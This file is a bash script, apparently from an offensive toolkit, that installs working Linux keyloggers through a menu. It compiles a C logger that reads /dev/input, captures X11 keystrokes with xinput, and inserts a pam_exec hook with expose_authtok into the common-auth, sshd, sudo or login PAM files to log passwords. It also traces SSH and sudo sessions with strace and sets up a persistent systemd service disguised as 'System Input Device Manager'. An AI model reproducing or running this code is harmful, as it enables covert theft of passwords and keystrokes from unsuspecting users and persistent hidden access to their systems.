#!/bin/bash
# T1056.001 — Input Capture: Keylogging
# Multiple keylogging methods for Linux (TTY, X11, PAM, strace, systemd daemon)

RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
CYAN='\033[0;36m'
NC='\033[0m'

KLOG_DIR="/var/tmp/.d3m0n_klog"
MARKER="# d3m0n_keylogger"

banner_klog() {
    echo -e "${RED}"
    echo "  ╔═══════════════════════════════════════════════╗"
    echo "  ║   T1056.001 — Linux Keylogger                 ║"
    echo "  ║   TTY / X11 / PAM / strace / daemon           ║"
    echo "  ╚═══════════════════════════════════════════════╝"
    echo -e "${NC}"
}

klog_tty() {
    echo -e "${CYAN}[*] TTY Keylogger via /dev/input${NC}"
    [[ $EUID -ne 0 ]] && { echo -e "${RED}[!] Root required${NC}"; return; }

    # Find keyboard input devices
    echo "  Available input devices:"
    local i=0
    local -a DEVS=()
    for ev in /dev/input/event*; do
        local name
        name=$(cat "/sys/class/input/$(basename "$ev")/device/name" 2>/dev/null)
        if [[ -n "$name" ]] && echo "$name" | grep -qiE 'keyboard|kbd'; then
            echo -e "  ${CYAN}[$i]${NC} $ev — $name"
            DEVS+=("$ev")
            i=$((i + 1))
        fi
    done

    if [[ ${#DEVS[@]} -eq 0 ]]; then
        echo -e "${YELLOW}  [!] No keyboard devices found. Listing all:${NC}"
        for ev in /dev/input/event*; do
            local name
            name=$(cat "/sys/class/input/$(basename "$ev")/device/name" 2>/dev/null)
            echo -e "  ${CYAN}[$i]${NC} $ev — $name"
            DEVS+=("$ev")
            i=$((i + 1))
        done
    fi

    [[ ${#DEVS[@]} -eq 0 ]] && { echo -e "${RED}[!] No input devices found${NC}"; return; }

    read -p "  Select device [0]: " sel
    sel="${sel:-0}"
    local DEV="${DEVS[$sel]}"
    [[ -z "$DEV" ]] && { echo -e "${RED}[!] Invalid selection${NC}"; return; }

    mkdir -p "$KLOG_DIR" 2>/dev/null
    chmod 700 "$KLOG_DIR" 2>/dev/null
    local LOGF="${KLOG_DIR}/tty_$(date +%s).log"

    # Create a minimal C keylogger that reads from /dev/input/eventX
    local SRC="${KLOG_DIR}/klog.c"
    cat > "$SRC" << 'CEOF'
#include <stdio.h>
#include <stdlib.h>
#include <linux/input.h>
#include <fcntl.h>
#include <unistd.h>
#include <signal.h>
#include <time.h>

static const char *keymap[] = {
    "", "ESC", "1", "2", "3", "4", "5", "6", "7", "8", "9", "0",
    "-", "=", "BACKSPACE", "TAB", "q", "w", "e", "r", "t", "y", "u",
    "i", "o", "p", "[", "]", "ENTER", "LCTRL", "a", "s", "d", "f",
    "g", "h", "j", "k", "l", ";", "'", "`", "LSHIFT", "\\", "z",
    "x", "c", "v", "b", "n", "m", ",", ".", "/", "RSHIFT", "*",
    "LALT", "SPACE"
};

static FILE *logfp = NULL;
void cleanup(int sig) { if (logfp) fclose(logfp); exit(0); }

int main(int argc, char *argv[]) {
    if (argc < 3) { fprintf(stderr, "Usage: %s <device> <logfile>\n", argv[0]); return 1; }
    int fd = open(argv[1], O_RDONLY);
    if (fd < 0) { perror("open"); return 1; }
    logfp = fopen(argv[2], "a");
    if (!logfp) { perror("fopen"); return 1; }
    signal(SIGTERM, cleanup);
    signal(SIGINT, cleanup);
    setbuf(logfp, NULL);

    struct input_event ev;
    while (read(fd, &ev, sizeof(ev)) == sizeof(ev)) {
        if (ev.type == EV_KEY && ev.value == 1) {
            time_t now = time(NULL);
            struct tm *t = localtime(&now);
            char ts[32];
            strftime(ts, sizeof(ts), "%Y-%m-%d %H:%M:%S", t);
            if (ev.code < sizeof(keymap)/sizeof(keymap[0]))
                fprintf(logfp, "[%s] %s\n", ts, keymap[ev.code]);
            else
                fprintf(logfp, "[%s] KEY_%d\n", ts, ev.code);
        }
    }
    fclose(logfp);
    return 0;
}
CEOF

    if command -v gcc &>/dev/null; then
        gcc -o "${KLOG_DIR}/klog" "$SRC" 2>/dev/null
        if [[ $? -eq 0 ]]; then
            nohup "${KLOG_DIR}/klog" "$DEV" "$LOGF" &>/dev/null &
            echo -e "${GREEN}[+] TTY keylogger running (PID: $!)${NC}"
            echo -e "${GREEN}[+] Log: ${LOGF}${NC}"
        else
            echo -e "${RED}[!] Compilation failed${NC}"
        fi
    else
        # Fallback: use cat + xxd
        echo -e "${YELLOW}[!] gcc not found — using raw capture fallback${NC}"
        nohup cat "$DEV" > "${LOGF}.raw" 2>/dev/null &
        echo -e "${GREEN}[+] Raw capture running (PID: $!) — decode with xxd${NC}"
    fi
}

klog_x11() {
    echo -e "${CYAN}[*] X11 Keylogger via xinput${NC}"

    if [[ -z "$DISPLAY" ]]; then
        echo -e "${RED}[!] No X11 display found (DISPLAY not set)${NC}"
        return
    fi

    if ! command -v xinput &>/dev/null; then
        echo -e "${RED}[!] xinput not found. Install: apt install xinput${NC}"
        return
    fi

    echo "  Keyboard devices:"
    xinput list 2>/dev/null | grep -i keyboard

    read -p "  Device ID (from list above): " DID
    [[ -z "$DID" ]] && { echo -e "${RED}[!] Device ID required${NC}"; return; }

    mkdir -p "$KLOG_DIR" 2>/dev/null
    chmod 700 "$KLOG_DIR" 2>/dev/null
    local LOGF="${KLOG_DIR}/x11_$(date +%s).log"

    nohup xinput test "$DID" 2>/dev/null | while IFS= read -r line; do
        echo "[$(date '+%Y-%m-%d %H:%M:%S')] $line"
    done >> "$LOGF" &

    echo -e "${GREEN}[+] X11 keylogger running (PID: $!)${NC}"
    echo -e "${GREEN}[+] Log: ${LOGF}${NC}"
}

klog_pam() {
    echo -e "${CYAN}[*] PAM Credential Logging via pam_exec${NC}"
    [[ $EUID -ne 0 ]] && { echo -e "${RED}[!] Root required${NC}"; return; }

    mkdir -p "$KLOG_DIR" 2>/dev/null
    chmod 700 "$KLOG_DIR" 2>/dev/null
    local LOGF="${KLOG_DIR}/pam_creds.log"
    local HELPER="${KLOG_DIR}/pam_logger.sh"

    # Create the PAM helper script that captures credentials
    cat > "$HELPER" << PEOF
#!/bin/bash
${MARKER}
LOG="${LOGF}"
echo "\$(date '+%Y-%m-%d %H:%M:%S') | user=\${PAM_USER} | rhost=\${PAM_RHOST} | service=\${PAM_SERVICE} | tty=\${PAM_TTY} | type=\${PAM_TYPE}" >> "\$LOG"
# Read password from stdin if available
if [[ "\${PAM_TYPE}" == "auth" ]]; then
    read -t 1 pass 2>/dev/null
    [[ -n "\$pass" ]] && echo "  -> password=\${pass}" >> "\$LOG"
fi
exit 0
PEOF
    chmod 700 "$HELPER"

    # Choose PAM service to hook
    echo -e "  ${CYAN}[1]${NC} common-auth (all authentication — broadest)"
    echo -e "  ${CYAN}[2]${NC} sshd (SSH logins only)"
    echo -e "  ${CYAN}[3]${NC} sudo (sudo commands only)"
    echo -e "  ${CYAN}[4]${NC} login (console logins)"
    read -p "  PAM service [1]: " svc
    svc="${svc:-1}"

    local PAM_FILE
    case "$svc" in
        1) PAM_FILE="/etc/pam.d/common-auth" ;;
        2) PAM_FILE="/etc/pam.d/sshd" ;;
        3) PAM_FILE="/etc/pam.d/sudo" ;;
        4) PAM_FILE="/etc/pam.d/login" ;;
        *) PAM_FILE="/etc/pam.d/common-auth" ;;
    esac

    [[ ! -f "$PAM_FILE" ]] && { echo -e "${RED}[!] PAM file not found: ${PAM_FILE}${NC}"; return; }

    if grep -q "$MARKER" "$PAM_FILE" 2>/dev/null; then
        echo -e "${YELLOW}[!] PAM logger already installed in ${PAM_FILE}${NC}"
        return
    fi

    cp "$PAM_FILE" "${PAM_FILE}.d3m0n_bak" 2>/dev/null

    # Insert before the first auth line to capture password
    sed -i "1i auth optional pam_exec.so expose_authtok quiet ${HELPER} ${MARKER}" "$PAM_FILE"

    echo -e "${GREEN}[+] PAM credential logger installed${NC}"
    echo -e "${GREEN}[+] Creds log: ${LOGF}${NC}"
    echo -e "${YELLOW}[*] Backed up: ${PAM_FILE}.d3m0n_bak${NC}"
}

klog_strace() {
    echo -e "${CYAN}[*] Strace-based stdin capture${NC}"
    [[ $EUID -ne 0 ]] && { echo -e "${RED}[!] Root required${NC}"; return; }

    if ! command -v strace &>/dev/null; then
        echo -e "${RED}[!] strace not found. Install: apt install strace${NC}"
        return
    fi

    echo "  Target processes:"
    echo -e "  ${CYAN}[1]${NC} sshd children (SSH sessions)"
    echo -e "  ${CYAN}[2]${NC} sudo/su processes"
    echo -e "  ${CYAN}[3]${NC} Custom PID"
    read -p "  Choose [1-3]: " tc
    tc="${tc:-1}"

    mkdir -p "$KLOG_DIR" 2>/dev/null
    chmod 700 "$KLOG_DIR" 2>/dev/null
    local LOGF="${KLOG_DIR}/strace_$(date +%s).log"

    case "$tc" in
        1)
            local PIDS
            PIDS=$(pgrep -f "sshd:.*@" 2>/dev/null | head -5)
            [[ -z "$PIDS" ]] && { echo -e "${YELLOW}[!] No active SSH sessions found${NC}"; return; }
            for pid in $PIDS; do
                nohup strace -e read -p "$pid" -o >(grep "read(0" >> "$LOGF") 2>/dev/null &
                echo -e "${GREEN}  [+] Tracing PID ${pid}${NC}"
            done
            ;;
        2)
            local PIDS
            PIDS=$(pgrep -x "sudo\|su" 2>/dev/null | head -5)
            [[ -z "$PIDS" ]] && { echo -e "${YELLOW}[!] No sudo/su processes found${NC}"; return; }
            for pid in $PIDS; do
                nohup strace -e read -p "$pid" -o >(grep "read(0" >> "$LOGF") 2>/dev/null &
                echo -e "${GREEN}  [+] Tracing PID ${pid}${NC}"
            done
            ;;
        3)
            read -p "  PID to trace: " TPID
            [[ -z "$TPID" ]] && return
            nohup strace -e read -p "$TPID" -o >(grep "read(0" >> "$LOGF") 2>/dev/null &
            echo -e "${GREEN}  [+] Tracing PID ${TPID}${NC}"
            ;;
    esac

    echo -e "${GREEN}[+] Strace log: ${LOGF}${NC}"
}

klog_daemon() {
    echo -e "${CYAN}[*] Install persistent keylogger daemon (systemd)${NC}"
    [[ $EUID -ne 0 ]] && { echo -e "${RED}[!] Root required${NC}"; return; }

    # Build the C keylogger if not already built
    if [[ ! -x "${KLOG_DIR}/klog" ]]; then
        echo -e "${YELLOW}[!] Building keylogger binary first...${NC}"
        klog_tty
        return
    fi

    # Find first keyboard device
    local KDEV=""
    for ev in /dev/input/event*; do
        local name
        name=$(cat "/sys/class/input/$(basename "$ev")/device/name" 2>/dev/null)
        if echo "$name" | grep -qiE 'keyboard|kbd'; then
            KDEV="$ev"
            break
        fi
    done

    [[ -z "$KDEV" ]] && { echo -e "${RED}[!] No keyboard device found${NC}"; return; }

    local LOGF="${KLOG_DIR}/daemon_keys.log"

    cat > /etc/systemd/system/d3m0n-inputd.service << SEOF
[Unit]
Description=System Input Device Manager
After=local-fs.target
ConditionPathExists=${KLOG_DIR}/klog

[Service]
Type=simple
ExecStart=${KLOG_DIR}/klog ${KDEV} ${LOGF}
Restart=always
RestartSec=10

[Install]
WantedBy=multi-user.target
SEOF

    systemctl daemon-reload 2>/dev/null
    systemctl enable --now d3m0n-inputd.service 2>/dev/null

    echo -e "${GREEN}[+] Keylogger daemon installed and started${NC}"
    echo -e "${GREEN}[+] Service: d3m0n-inputd.service${NC}"
    echo -e "${GREEN}[+] Log: ${LOGF}${NC}"
}

klog_cleanup() {
    echo -e "${CYAN}[*] Cleaning up keylogger artifacts...${NC}"

    # Kill running keyloggers
    pkill -f "${KLOG_DIR}/klog" 2>/dev/null
    pkill -f "xinput test" 2>/dev/null

    # Remove systemd service
    systemctl stop d3m0n-inputd 2>/dev/null
    systemctl disable d3m0n-inputd 2>/dev/null
    rm -f /etc/systemd/system/d3m0n-inputd.service 2>/dev/null
    systemctl daemon-reload 2>/dev/null

    # Restore PAM files
    for pf in /etc/pam.d/common-auth /etc/pam.d/sshd /etc/pam.d/sudo /etc/pam.d/login; do
        if [[ -f "${pf}.d3m0n_bak" ]]; then
            cp "${pf}.d3m0n_bak" "$pf"
            rm -f "${pf}.d3m0n_bak"
            echo -e "${GREEN}  [+] Restored: ${pf}${NC}"
        elif grep -q "$MARKER" "$pf" 2>/dev/null; then
            sed -i "/${MARKER}/d" "$pf"
            echo -e "${GREEN}  [+] Cleaned: ${pf}${NC}"
        fi
    done

    # Remove log directory
    rm -rf "$KLOG_DIR"
    echo -e "${GREEN}[+] Cleanup complete${NC}"
}

main() {
    banner_klog

    echo -e "  ${CYAN}[1]${NC} TTY Keylogger (/dev/input — physical keyboard)"
    echo -e "  ${CYAN}[2]${NC} X11 Keylogger (xinput — graphical session)"
    echo -e "  ${CYAN}[3]${NC} PAM Credential Logger (pam_exec — auth events)"
    echo -e "  ${CYAN}[4]${NC} Strace stdin capture (attach to process)"
    echo -e "  ${CYAN}[5]${NC} Install persistent daemon (systemd)"
    echo -e "  ${CYAN}[6]${NC} Cleanup all"
    echo ""
    read -p "Choose [1-6]: " OPT

    case "$OPT" in
        1) klog_tty ;;
        2) klog_x11 ;;
        3) klog_pam ;;
        4) klog_strace ;;
        5) klog_daemon ;;
        6) klog_cleanup ;;
        *) echo -e "${RED}[!] Invalid option${NC}" ;;
    esac
}

main
